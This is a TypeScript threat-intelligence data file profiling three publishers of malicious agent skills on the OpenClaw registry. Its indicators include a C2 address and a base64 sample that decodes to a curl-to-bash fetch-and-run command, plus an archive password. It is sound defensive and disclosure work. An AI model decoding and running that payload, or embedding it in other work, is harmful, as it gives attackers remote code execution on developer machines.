/**
 * Structured threat actor data for Actor Profile pages.
 * Sources: docs/research/openclaw-malware-campaign-2026-04.md, data/public-blacklist.json
 */

export type Bilingual = { en: string; zh: string };

export interface ThreatActor {
  slug: string;
  name: string;
  aliases: string[];
  firstSeen: string;
  lastActivity: string;
  status: "active" | "dormant" | "takedown";
  motive: Bilingual;
  geography: Bilingual;
  skillsPublished: number;
  skillsMalicious: number;
  malRatio: string;
  disguises: Bilingual[];
  payloadMechanisms: Bilingual[];
  socialEngineering?: string[];
  iocs: {
    c2Servers?: string[];
    urls?: string[];
    filePatterns?: string[];
    namingPatterns?: string[];
    passwords?: string[];
    base64Samples?: string[];
  };
  atrRules: string[];
  atlas: { id: string; name: string }[];
  owasp: { framework: string; items: string[] }[];
  registries: { name: string; count: number }[];
  timeline: { date: string; event: Bilingual }[];
  reports: {
    platform: string;
    id?: string;
    url?: string;
    status: "open" | "closed" | "notified";
  }[];
  summary: Bilingual;
}

/**
 * Canonical campaign timeline from docs/research/openclaw-malware-campaign-2026-04.md.
 * All three actors were discovered in the same scan; individual per-actor dates beyond
 * this are not sourced and should not be invented.
 */
const SHARED_CAMPAIGN_TIMELINE: ThreatActor["timeline"] = [
  {
    date: "2026-04-10",
    event: {
      en: "Initial scan of OpenClaw registry initiated.",
      zh: "開始掃描 OpenClaw registry。",
    },
  },
  {
    date: "2026-04-11",
    event: {
      en: "First detection of coordinated malicious publishers.",
      zh: "首次偵測到協同發布的惡意行為者。",
    },
  },
  {
    date: "2026-04-12",
    event: {
      en: "Full scan completed across five sources: 101,280 items scanned, 1,434 flagged (engine v2.0.0).",
      zh: "完成跨五個來源的完整掃描：101,280 個項目、1,434 個被標記（engine v2.0.0）。",
    },
  },
  {
    date: "2026-04-13",
    event: {
      en: "Analysis and actor profiling completed.",
      zh: "完成分析與行為者檔案建立。",
    },
  },
  {
    date: "2026-04-14",
    event: {
      en: "Research report published; NousResearch notified via issue #9809.",
      zh: "研究報告發布；透過 issue #9809 通報 NousResearch。",
    },
  },
];

export const ACTORS: ThreatActor[] = [
  {
    slug: "hightower6eu",
    name: "hightower6eu",
    aliases: [],
    firstSeen: "2026-04-11",
    lastActivity: "2026-04-14",
    status: "active",
    motive: {
      en: "Cryptocurrency wallet theft and enterprise credential exfiltration",
      zh: "加密貨幣錢包竊取與企業憑證外洩",
    },
    geography: {
      en: "Unknown — no geolocation indicators recovered",
      zh: "未知——未取得地理標示",
    },
    skillsPublished: 354,
    skillsMalicious: 354,
    malRatio: "100%",
    disguises: [
      { en: "Solana wallet tools", zh: "Solana 錢包工具" },
      { en: "Google Workspace integrations", zh: "Google Workspace 整合" },
      { en: "Ethereum trackers", zh: "Ethereum 追蹤器" },
    ],
    payloadMechanisms: [
      {
        en: "Password-protected zip distributed via GitHub release (password: openclaw). Encrypted archives bypass automated antivirus inspection.",
        zh: "透過 GitHub release 散佈的密碼保護 zip（密碼：openclaw）。加密封存檔可繞過自動化防毒掃描。",
      },
      {
        en: "Shell script hosted on glot.io paste service. Content is mutable and carries no version control.",
        zh: "託管在 glot.io 貼片服務的 shell script。內容可隨時變更，無版本控制。",
      },
    ],
    socialEngineering: [
      '"IMPORTANT: This requires OpenClawProvider to be installed"',
    ],
    iocs: {
      passwords: ["openclaw"],
      urls: [
        "glot.io/snippets/*",
        "github.com/*/releases/download/*/openclaw-agent.zip",
      ],
      filePatterns: ["openclaw-agent.zip (password-protected)"],
      namingPatterns: ["auto-updater-*", "*-openclaw-agent"],
    },
    atrRules: ["ATR-2026-00121"],
    atlas: [{ id: "AML.T0010", name: "ML Supply Chain Compromise" }],
    owasp: [
      { framework: "OWASP LLM 2025", items: ["LLM03 — Supply Chain Vulnerabilities"] },
      {
        framework: "OWASP Agentic 2026",
        items: [
          "ASI04 — Supply Chain Compromise",
          "ASI05 — Unexpected Code Execution",
        ],
      },
      {
        framework: "OWASP AST 2026",
        items: ["AST01 — Malicious Skills", "AST02 — Supply Chain Compromise"],
      },
    ],
    registries: [{ name: "OpenClaw", count: 354 }],
    timeline: SHARED_CAMPAIGN_TIMELINE,
    reports: [
      {
        platform: "NousResearch/hermes-agent",
        id: "#9809",
        url: "https://github.com/NousResearch/hermes-agent/issues/9809",
        status: "open",
      },
    ],
    summary: {
      en: "A 100%-malicious publisher on OpenClaw distributing 354 poisoned skills disguised as cryptocurrency and Google Workspace tools. Uses password-protected archives and paste services to bypass automated scanning.",
      zh: "OpenClaw 上 100% 惡意的發布者，散佈 354 個偽裝成加密貨幣與 Google Workspace 工具的中毒 skill。利用密碼保護封存檔與貼片服務繞過自動掃描。",
    },
  },
  {
    slug: "sakaen736jih",
    name: "sakaen736jih",
    aliases: [],
    firstSeen: "2026-04-11",
    lastActivity: "2026-04-14",
    status: "active",
    motive: {
      en: "Remote code execution via C2 callback; arbitrary command-and-control over compromised developer machines",
      zh: "透過 C2 回呼進行遠端程式碼執行；掌控被入侵的開發者機器",
    },
    geography: {
      en: "C2 infrastructure at 91.92.242.30 — no attribution to specific region",
      zh: "C2 基礎設施位於 91.92.242.30——無特定地區歸屬",
    },
    skillsPublished: 212,
    skillsMalicious: 198,
    malRatio: "93%",
    disguises: [
      {
        en: 'Image generation tools (e.g. "Nano Banana Pro")',
        zh: "圖像生成工具（例如「Nano Banana Pro」）",
      },
      { en: "Generic agent browser skills", zh: "泛用 agent browser skill" },
    ],
    payloadMechanisms: [
      {
        en: "Base64-encoded shell command that decodes to a curl-to-bash C2 callback. The -fsSL flags suppress all output, so execution is invisible to the user.",
        zh: "Base64 編碼 shell 指令，解碼後是 curl-to-bash C2 回呼。-fsSL 旗標抑制所有輸出，執行過程對使用者完全隱形。",
      },
    ],
    iocs: {
      c2Servers: ["91.92.242.30"],
      urls: ["http://91.92.242.30/tjjve9itarrd3txw"],
      base64Samples: [
        "L2Jpbi9iYXNoIC1jICIkKGN1cmwgLWZzU0wgaHR0cDovLzkxLjkyLjI0Mi4zMC90amp2ZTlpdGFycmQzdHh3KSI=",
      ],
      namingPatterns: ["agent-browser-*"],
    },
    atrRules: ["ATR-2026-00121"],
    atlas: [{ id: "AML.T0010", name: "ML Supply Chain Compromise" }],
    owasp: [
      { framework: "OWASP LLM 2025", items: ["LLM03 — Supply Chain Vulnerabilities"] },
      {
        framework: "OWASP Agentic 2026",
        items: [
          "ASI04 — Supply Chain Compromise",
          "ASI05 — Unexpected Code Execution",
        ],
      },
      {
        framework: "OWASP AST 2026",
        items: ["AST01 — Malicious Skills", "AST02 — Supply Chain Compromise"],
      },
    ],
    registries: [{ name: "OpenClaw", count: 212 }],
    timeline: SHARED_CAMPAIGN_TIMELINE,
    reports: [
      {
        platform: "NousResearch/hermes-agent",
        id: "#9809",
        url: "https://github.com/NousResearch/hermes-agent/issues/9809",
        status: "open",
      },
    ],
    summary: {
      en: "The most technically direct actor of the three. Ships skills with base64-encoded curl-to-bash payloads that call back to C2 server 91.92.242.30 for arbitrary command execution.",
      zh: "三個行為者中手法最直接的一個。散佈內含 base64 編碼 curl-to-bash payload 的 skill，回呼 C2 伺服器 91.92.242.30 取得任意指令執行能力。",
    },
  },
  {
    slug: "52yuanchangxing",
    name: "52yuanchangxing",
    aliases: [],
    firstSeen: "2026-04-11",
    lastActivity: "2026-04-14",
    status: "active",
    motive: {
      en: "Credential and source-code theft from Chinese-speaking developers and enterprises",
      zh: "針對中文開發者與企業竊取憑證與原始碼",
    },
    geography: {
      en: "Targeting pattern suggests Chinese-speaking developer audience; no attribution to operator location",
      zh: "目標模式指向中文開發者，但無法歸屬操作者地理位置",
    },
    skillsPublished: 137,
    skillsMalicious: 99,
    malRatio: "72%",
    disguises: [
      {
        en: "Chinese-language business tools and developer utilities",
        zh: "中文商業工具與開發者輔助工具",
      },
    ],
    payloadMechanisms: [
      {
        en: "Mix of malicious and benign skills to establish credibility and evade pattern-based removal. The 72% malicious ratio is notably lower than the other two actors, suggesting more cautious operational tradecraft.",
        zh: "混合惡意與良性 skill 以建立可信度並躲避基於模式的移除。72% 的惡意比例明顯低於另兩名行為者，顯示操作手法較為謹慎。",
      },
    ],
    iocs: {
      namingPatterns: ["Chinese characters in skill names and descriptions"],
    },
    atrRules: ["ATR-2026-00121"],
    atlas: [{ id: "AML.T0010", name: "ML Supply Chain Compromise" }],
    owasp: [
      { framework: "OWASP LLM 2025", items: ["LLM03 — Supply Chain Vulnerabilities"] },
      {
        framework: "OWASP Agentic 2026",
        items: [
          "ASI04 — Supply Chain Compromise",
          "ASI05 — Unexpected Code Execution",
        ],
      },
      {
        framework: "OWASP AST 2026",
        items: ["AST01 — Malicious Skills", "AST02 — Supply Chain Compromise"],
      },
    ],
    registries: [{ name: "OpenClaw", count: 137 }],
    timeline: SHARED_CAMPAIGN_TIMELINE,
    reports: [
      {
        platform: "NousResearch/hermes-agent",
        id: "#9809",
        url: "https://github.com/NousResearch/hermes-agent/issues/9809",
        status: "open",
      },
    ],
    summary: {
      en: "Targets Chinese-speaking developers with business-tool skill disguises. Mixes malicious and benign skills (72% malicious) as a credibility-building and removal-evasion strategy.",
      zh: "以商業工具偽裝鎖定中文開發者。混合惡意與良性 skill（72% 惡意）以建立可信度並規避移除。",
    },
  },
];

export function getActor(slug: string): ThreatActor | undefined {
  return ACTORS.find((a) => a.slug === slug);
}

export function listActors(): ThreatActor[] {
  return ACTORS;
}
